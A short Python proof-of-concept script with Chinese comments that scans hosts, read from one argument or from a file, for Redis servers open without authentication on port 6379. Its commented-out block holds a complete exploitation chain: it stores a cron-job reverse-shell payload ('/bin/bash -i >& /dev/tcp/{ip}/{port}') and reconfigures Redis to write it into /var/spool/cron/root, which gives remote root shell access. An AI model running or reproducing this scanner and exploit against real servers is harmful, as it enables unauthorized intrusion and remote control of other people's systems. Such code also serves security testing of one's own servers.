#coding=utf-8
import sys
import redis
from redis import StrictRedis
def redis_search(Host=None ,Port=6379):
    try:
        ###连接redis
        req = redis.Redis(host=Host,port=Port,db=0)
        #print(req.info())
        if 'redis_version' in req.info():
            print('【+】' + str(Host)+ ' 可能存在 redis 未授权!')
            ###尝试写计划任务
            # payload = '\n\n*/1 * * * * /bin/bash -i >& /dev/tcp/{ip}/{port} 0>&1\n\n') ###ip和端口自定义
            # print(payload)
            # path = '/var/spool/cron'
            # name = 'root'
            # req.set('test',payload)
            # req.config_set('dir',path)
            # req.config_set('dbfilename',name)
            # req.save()
            # req.delete(test)
            # req.config_set('dir','/tmp')
    except:
        print("【-】连接错误  " + str(Host))
        pass

if __name__=='__main__':
    try:
        if "txt" in sys.argv[1]:
            file = open(sys.argv[1],'r')
            for i in file:
                host = i.strip()
                redis_search(Host=host)
            file.close()
        else:
            host = sys.argv[1]
            redis_search(Host=host)
    except:
        print("使用：python3 6379_poc url/file  #默认6379端口")
